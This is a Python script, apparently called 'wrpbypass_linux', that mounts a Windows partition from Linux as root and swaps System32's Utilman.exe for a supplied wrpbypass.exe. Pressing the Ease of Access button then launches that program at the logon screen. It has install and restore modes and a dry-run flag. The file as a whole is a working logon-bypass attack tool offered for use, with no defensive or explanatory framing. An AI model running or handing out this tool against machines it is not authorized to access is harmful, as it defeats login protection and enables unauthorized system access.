#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import os
import subprocess
import sys
from pathlib import Path


def run(cmd):
    print(f"[+] Run: {' '.join(cmd)}")
    res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if res.returncode != 0:
        print(f"[!] Command failed: {res.stderr.strip()}")
        raise RuntimeError(f"Command exited with code {res.returncode}")
    return res.stdout.strip()


def ensure_root():
    if os.geteuid() != 0:
        print("[!] This program must be run as root (sudo).")
        sys.exit(1)


def mount_partition(device, mountpoint):
    mountpoint = Path(mountpoint)
    mountpoint.mkdir(parents=True, exist_ok=True)
    # try ntfs-3g if available
    try:
        run(["mount", "-t", "ntfs-3g", device, str(mountpoint)])
    except Exception:
        # fallback to default mount
        run(["mount", device, str(mountpoint)])
    print(f"[+] Partition {device} mounted at {mountpoint}")
    return mountpoint


def umount_partition(mountpoint):
    run(["umount", str(mountpoint)])
    print(f"[+] Unmounted: {mountpoint}")


def backup_and_replace_utilman(win_root, wrp_exe_src, dry_run=False):
    windows_dir = Path(win_root) / "Windows" / "System32"
    if not windows_dir.is_dir():
        print(f"[!] {windows_dir} not found. This does not look like a Windows system root.")
        return
    utilman = windows_dir / "Utilman.exe"
    utilman_backup = windows_dir / "Utilman.exe.tmp"
    wrp_exe_dst = windows_dir / "wrpbypass.exe"

    if not utilman.exists():
        print(f"[!] {utilman} not found. Make sure you selected the correct partition.")
        return

    if not Path(wrp_exe_src).exists():
        print(f"[!] wrpbypass.exe not found at {wrp_exe_src}")
        return

    # Backup Utilman.exe
    if utilman_backup.exists():
        print("[!] Backup Utilman.exe.tmp already exists. Skipping backup.")
    else:
        print(f"[+] Renaming {utilman} -> {utilman_backup}")
        if not dry_run:
            utilman.rename(utilman_backup)

    # Copy our wrpbypass.exe
    print(f"[+] Copy {wrp_exe_src} -> {wrp_exe_dst}")
    if not dry_run:
        run(["cp", str(wrp_exe_src), str(wrp_exe_dst)])

    # Replace Utilman.exe
    print(f"[+] Replacing {utilman} with wrpbypass.exe")
    if not dry_run:
        if utilman.exists():
            utilman.unlink()
        wrp_exe_dst.rename(utilman)

    print("[+] Replacement completed. On the logon screen, press the Ease of Access button to start wrpbypass.")
    if dry_run:
        print("[DRY-RUN] No files were actually modified.")


def restore_files(win_root, dry_run=False):
    windows_dir = Path(win_root) / "Windows" / "System32"
    utilman = windows_dir / "Utilman.exe"
    utilman_backup = windows_dir / "Utilman.exe.tmp"
    wrp_exe = windows_dir / "wrpbypass.exe"

    if not utilman_backup.exists():
        print("[!] Backup file Utilman.exe.tmp not found. Nothing to restore.")
        return

    # Remove standalone wrpbypass.exe if present
    if wrp_exe.exists():
        print(f"[+] Removing {wrp_exe}")
        if not dry_run:
            wrp_exe.unlink()

    # Remove current Utilman.exe if it is not the backup
    if utilman.exists() and utilman != utilman_backup:
        print(f"[+] Removing current {utilman}")
        if not dry_run:
            utilman.unlink()

    print(f"[+] Restoring {utilman_backup} -> {utilman}")
    if not dry_run:
        utilman_backup.rename(utilman)

    print("[+] Files successfully restored.")
    if dry_run:
        print("[DRY-RUN] No files were actually modified.")


def main(): 
    parser = argparse.ArgumentParser(
        description="wrpbypass_linux: replace/restore Utilman.exe on a Windows partition"
    )
    parser.add_argument("--device", required=True, help="Windows partition device (e.g. /dev/sda1)")
    parser.add_argument("--mountpoint", default="/mnt/win", help="Mount point (default: /mnt/win)")
    parser.add_argument(
        "--mode",
        choices=["install", "restore"],
        required=True,
        help="Mode: install (replace) or restore (restore original files)",
    )
    parser.add_argument(
        "--wrpbypass-exe",
        help="Path to wrpbypass.exe (required in install mode, e.g. /media/usb/dist/wrpbypass.exe)",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Show what would be done without modifying any files",
    )

    args = parser.parse_args()
    ensure_root()

    mountpoint = None
    try:
        mountpoint = mount_partition(args.device, args.mountpoint)

        if args.mode == "install":
            if not args.wrpbypass_exe:
                print("[!] In install mode you must pass --wrpbypass-exe /path/to/wrpbypass.exe")
                sys.exit(1)
            backup_and_replace_utilman(mountpoint, args.wrpbypass_exe, dry_run=args.dry_run)
        elif args.mode == "restore":
            restore_files(mountpoint, dry_run=args.dry_run)
    finally:
        # Path.is_mount() не существует, используем os.path.ismount
        if mountpoint and os.path.ismount(str(mountpoint)):
            try:
                umount_partition(mountpoint)
            except Exception as e:
                print(f"[!] Ошибка размонтирования: {e}")


if __name__ == "__main__":
    main()

